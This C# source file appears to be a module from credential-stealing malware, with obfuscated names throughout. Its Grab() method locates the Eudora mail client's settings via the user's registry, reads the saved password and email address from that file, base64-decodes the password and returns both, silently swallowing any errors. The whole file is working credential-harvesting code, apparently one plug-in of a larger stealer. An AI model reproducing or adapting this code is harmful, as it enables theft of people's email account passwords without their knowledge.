using System;
using System.Collections.Generic;
using System.Text;
using C6Zy;
using Microsoft.Win32;
using UHyll;

namespace rk937aHHc
{
    public class Eudora : EtbH
    {
        public Eudora()
        {
            this.Fi6ByjtupAB = "Eudora";
        }

        public string Fi6ByjtupAB { get; set; }

        public List<WTitxI2m> Grab()
        {
            List<WTitxI2m> list = new List<WTitxI2m>();

            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Qualcomm\\Eudora\\CommandLine\\");
                if (registryKey == null)
                    return list;

                string current = (string)registryKey.GetValue("current");
                if (string.IsNullOrEmpty(current))
                    return list;

                string[] args = current.Split(' ');
                if (args.Length < 3)
                    return list;

                string lpFileName = args[2];
                StringBuilder savePasswordText = new StringBuilder(500);
                StringBuilder returnAddress = new StringBuilder(500);

                FNu.GetPrivateProfileString("Settings", "SavePasswordText", "", savePasswordText, savePasswordText.Capacity, lpFileName);
                FNu.GetPrivateProfileString("Settings", "ReturnAddress", "", returnAddress, returnAddress.Capacity, lpFileName);

                list.Add(new WTitxI2m
                {
                    data1 = "-",
                    data4 = this.Fi6ByjtupAB,
                    data3 = Encoding.UTF8.GetString(Convert.FromBase64String(savePasswordText.ToString())),
                    data2 = returnAddress.ToString()
                });
            }
            catch
            {
            }

            return list;
        }
    }
 }
